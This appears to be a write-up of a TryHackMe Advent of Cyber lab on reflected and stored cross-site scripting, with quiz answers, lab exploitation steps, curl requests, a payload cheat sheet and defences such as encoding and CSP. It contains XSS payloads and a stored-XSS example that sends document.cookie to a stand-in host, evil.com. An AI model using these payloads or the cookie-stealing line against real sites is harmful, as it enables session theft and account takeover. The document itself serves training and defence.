# Advent of Cyber 2025 Day 11 - TryHackMe

> XSS - Merry XSSMas

**Day 11 Link:** https://tryhackme.com/room/xss-aoc2025-c5j8b1m4t6
---

## Story

**Scenario:** Web application vulnerable to XSS attacks

**Target:** http://MACHINE_IP

**Goal:** Exploit Reflected and Stored XSS vulnerabilities

---

## XSS Basics

**What is XSS:**
- Inject malicious JavaScript into web pages
- User input not properly validated
- Browser executes injected code
- Can steal data or impersonate users

**Types of XSS:**

**Reflected XSS:**
- Payload in URL/request
- Not stored on server
- Affects single user
- Requires victim to click link

**Stored XSS:**
- Payload saved in database
- Persists on server
- Affects all visitors
- High impact

**DOM-based XSS:**
- Client-side only
- Never sent to server
- JavaScript vulnerability

---

## Question 1

**Q: Which type of XSS requires payloads to be persisted on backend?**

**Answer:** `Stored XSS`

---

## Reflected XSS Exploitation

### Step 1: Find Input Field

Navigate to:
```
http://MACHINE_IP
```

**Target:** Search bar

### Step 2: Inject Payload

**Payload:**
```html
<script>alert('Reflected Meow Meow')</script>
```

**Method 1: Browser**
1. Enter payload in search bar
2. Click "Search Messages"

**Method 2: Curl**
```bash
curl 'http://MACHINE_IP/?search=%3Cscript%3Ealert(%27Reflected+Meow+Meow%27)%3C%2Fscript%3E'
```

### Step 3: Observe Result

**What happens:**
- Input reflected in search results
- Browser executes JavaScript
- Alert box appears
- XSS confirmed!

### Step 4: Check Logs

System logs show unusual payloads detected.

### Step 5: Get Flag

**Flag location:** Alert box or page source

**Q: Reflected XSS flag?**

**Answer:** `THM{...}` (from alert)

---

## Stored XSS Exploitation

### Step 1: Find Persistent Field

**Target:** Send message/comment form

### Step 2: Submit Malicious Payload

**Payload:**
```html
<script>alert('Stored Meow Meow')</script>
```

**Method 1: Browser**
1. Enter payload in message field
2. Click "Send Message"

**Method 2: Curl (Store)**
```bash
curl -X POST \
  -d "action=comment&comment=%3Cscript%3Ealert%28%27Stored+Meow+Meow%27%29%3C%2Fscript%3E" \
  http://MACHINE_IP/
```

**Method 2: Curl (Trigger)**
```bash
curl 'http://MACHINE_IP/?comment_success=1'
```

### Step 3: Observe Persistence

**What happens:**
- Payload saved in database
- Every page reload triggers script
- All visitors affected
- Alert appears automatically

### Step 4: Check Logs

System logs detect stored payload.

### Step 5: Get Flag

**Flag location:** Alert box on comment page

**Q: Stored XSS flag?**

**Answer:** `THM{...}` (from stored alert)

---

## Quick Reference

### Basic XSS Payloads

**Simple alert:**
```html
<script>alert('XSS')</script>
```

**Image tag:**
```html
<img src=x onerror=alert('XSS')>
```

**Event handler:**
```html
<body onload=alert('XSS')>
```

**SVG tag:**
```html
<svg onload=alert('XSS')>
```

### Testing Workflow

**For Reflected XSS:**
1. Find input field
2. Inject test payload
3. Submit/search
4. Check if executed
5. Observe in URL/response

**For Stored XSS:**
1. Find persistent field (comments, profile)
2. Submit payload
3. Reload/visit page
4. Check if payload persists
5. Verify execution on reload

### Impact Comparison

| Type | Storage | Victims | Impact |
|------|---------|---------|--------|
| Reflected | No | Single | Medium |
| Stored | Yes | All | High |
| DOM-based | No | Single | Medium |

---

## Attack Scenarios

### Reflected XSS

**Example attack:**
```
http://site.com/search?q=<script>alert(document.cookie)</script>
```

**What attacker does:**
1. Craft malicious URL
2. Send to victim (phishing)
3. Victim clicks link
4. Script executes in victim's browser

**Potential impact:**
- Steal session cookies
- Redirect to phishing site
- Keylogging
- Form hijacking

### Stored XSS

**Example attack:**
```
Comment: <script>fetch('evil.com?c='+document.cookie)</script>
```

**What happens:**
1. Attacker posts malicious comment
2. Comment stored in database
3. Every visitor loads comment
4. Script executes for all users

**Potential impact:**
- Steal all users' cookies
- Deface website
- Spread malware
- Account takeover

---

## Defense Strategies

### Input Validation

**Sanitize input:**
- Remove `<script>` tags
- Strip dangerous characters
- Whitelist allowed input
- Validate data types

### Output Encoding

**Encode output:**
- HTML entity encoding
- JavaScript encoding
- URL encoding
- CSS encoding

**Example:**
```
< becomes &lt;
> becomes &gt;
" becomes &quot;
```

### Secure Coding

**Best practices:**
- Use `textContent` not `innerHTML`
- Avoid `eval()` and similar functions
- Validate on server-side
- Don't trust client input

### Cookie Security

**Set flags:**
```
HttpOnly: Prevents JavaScript access
Secure: HTTPS only
SameSite: CSRF protection
```

### Content Security Policy (CSP)

**Header example:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Benefits:**
- Blocks inline scripts
- Whitelist trusted sources
- Prevents many XSS attacks

---

## Detection Methods

### Manual Testing

**Test inputs:**
- Search boxes
- Comment forms
- User profiles
- URL parameters
- Form fields

**Watch for:**
- Input reflected in response
- JavaScript execution
- Alert boxes appearing
- Console errors

### Automated Tools

**Scanners:**
- Burp Suite
- OWASP ZAP
- XSStrike
- Nikto

### Log Monitoring

**Look for:**
- `<script>` in logs
- Unusual payloads
- Alert keywords
- Encoded characters
- Multiple injection attempts

---

## Key Takeaways

- **XSS** exploits improper input handling
- **Reflected XSS** targets individuals via links
- **Stored XSS** persists and affects everyone
- **Always validate** and sanitize input
- **Encode output** before displaying
- **Use CSP** to prevent script execution
- **HttpOnly cookies** prevent theft
- **Never trust** user input
- **Test all** input fields
- **Monitor logs** for attack attempts

---

Happy hunting!
